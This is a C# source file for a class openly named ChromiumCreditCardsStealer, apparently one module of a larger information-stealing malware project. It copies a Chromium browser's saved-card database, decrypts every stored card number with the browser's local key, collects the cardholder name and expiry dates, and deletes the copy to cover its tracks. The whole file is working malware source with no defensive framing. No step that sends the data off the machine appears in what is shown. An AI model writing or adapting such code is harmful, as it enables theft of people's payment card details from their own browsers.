using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class ChromiumCreditCardsStealer
{
    public static List<CreditCardModel> GetCreditCards(string path, string keyPath)
    {
        if (!System.IO.File.Exists(path))
        {
            return new List<CreditCardModel>();
        }

        if (!System.IO.File.Exists(keyPath))
        {
            return new List<CreditCardModel>();
        }

        path = FileUtils.CopyFile(path);
        List<CreditCardModel> result = new List<CreditCardModel>();

        if (File.Exists(path))
        {
            using (var conn = new SQLiteConnection($"Data Source={path};"))
            {
                conn.Open();

                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = "SELECT * FROM credit_cards";

                    using (var reader = cmd.ExecuteReader())
                    {
                        if (reader.HasRows)
                        {
                            var key = ChromiumDecryptor.GetKey(keyPath);

                            while (reader.Read())
                            {
                                byte[] nonce, ciphertextTag, encryptedData = SQLUtils.GetBytes(reader, 4);
                                ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                                string number = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce), name = reader.GetString(1), expMonth = reader.GetInt32(2).ToString(), expYear = reader.GetInt32(3).ToString();

                                if (expMonth.Length == 1)
                                {
                                    expMonth = "0" + expMonth;
                                }

                                if (expYear.Length == 1)
                                {
                                    expYear = "0" + expYear;
                                }

                                result.Add(new CreditCardModel()
                                {
                                    CardNumber = number,
                                    ExpireMonth = expMonth,
                                    ExpireYear = expYear,
                                    Name = name
                                });
                            }
                        }
                    }
                }

                conn.Close();
                conn.Dispose();
            }
        }

        System.IO.File.Delete(path);
        return result;
    }
}